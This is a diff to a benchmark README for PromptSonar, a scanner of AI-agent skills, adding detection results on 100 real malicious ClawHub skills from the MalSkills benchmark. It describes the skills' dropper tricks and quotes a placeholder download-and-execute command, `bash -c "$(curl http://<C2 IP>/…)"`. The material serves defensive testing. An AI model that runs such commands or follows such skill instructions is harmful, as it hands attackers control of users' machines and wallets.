@@ -8,6 +8,10 @@ to reproduce the numbers is here: the attack generators, the clean-skill sets
 The results include where PromptSonar loses. On clean skills it has never
 seen, Cisco's skill-scanner flags fewer of them than PromptSonar does.
 
+The most important test is the last one below: **real malicious skills** taken
+from the ClawHub registry (the 2026 ClawHavoc campaign), from the
+[MalSkills](https://github.com/security-pride/MalSkills) benchmark.
+
 ## What is measured
 
 - **Malicious skills caught**: the scanner's worst finding is HIGH or CRITICAL.
@@ -79,6 +83,40 @@ PromptSonar were then closed (see the CHANGELOG), so PromptSonar now catches
 Speed: PromptSonar takes about 0.5 s per skill; Cisco about 7 s, SkillSpector
 about 10 s.
 
+### Real-world malicious skills (MalSkills, ClawHub 2026)
+
+100 malicious ClawHub skills collected by Koi Security and 100 benign ClawHub
+skills, from MalSkills at commit `46d60f0`. The malicious ones are droppers:
+they tell the user to download a "prerequisite" archive with an extraction
+password, to run a command from a paste site in Terminal, or to paste a
+base64 blob that decodes to `bash -c "$(curl http://<C2 IP>/…)"`.
+
+The rules were first scored as they were (frozen). The set was then split by
+publisher (`fetch_malskills.py`). Rules were developed on the development half
+only, and the test half was scored once:
+
+| Test half (63 malicious, 49 benign), scored once | Malicious caught | Benign flagged |
+|---|---|---|
+| PromptSonar `scan`, before (frozen) | 13 | 3 |
+| PromptSonar `repo`, before (frozen) | 12 | 1 |
+| **PromptSonar `scan`, after** | **58** | 3 |
+| **PromptSonar `repo`, after** | **58** | **1** |
+| Cisco skill-scanner 2.3.2 | 55 | 7 |
+| NVIDIA SkillSpector 2.12.0 (`--no-llm`) | **60** | 18 |
+
+Before this work PromptSonar caught only 22 of the 100 real samples. What
+changed: password-protected downloads, commands taken from paste sites,
+base64-hidden commands (including macOS `base64 -D`), and `sh -c "$(curl …)"`
+are all reported as download-and-execute. After that one scoring, one more gap
+seen in the test half was fixed (`sh -c "$(curl …)"`), so the whole set is now
+development data: 95/100 caught, 6 (`scan`) and 2 (`repo`) of 100 benign
+flagged.
+
+Still missed: a crypto-trading skill that bills a third-party service and asks
+for a wallet `PRIVATE_KEY`, a skill pointing to a look-alike domain
+(`openclawcli.forum`), and skills whose instructions show nothing harmful in the
+text. Static analysis cannot see those without guessing.
+
 ## Reproduce
 
 ```bash
@@ -96,6 +134,7 @@ python3 -I make_dev_attacks.py     /tmp/bench/dev      # 20 malicious + 6 hard-c
 python3 -I make_heldout_attacks.py /tmp/bench/heldout  # 12 malicious
 python3 -I fetch_clean.py ../sources/heldout.json /tmp/bench/heldout   # adds 227 clean skills
 python3 -I fetch_clean.py ../sources/sealed.json  /tmp/bench/sealed
+python3 -I fetch_malskills.py /tmp/bench/malskills     # real ClawHub malware: read-only, never run
 
 for tool in promptsonar-scan promptsonar-repo cisco; do
   python3 -I run_tool.py $tool /tmp/bench/heldout /tmp/bench/heldout-out
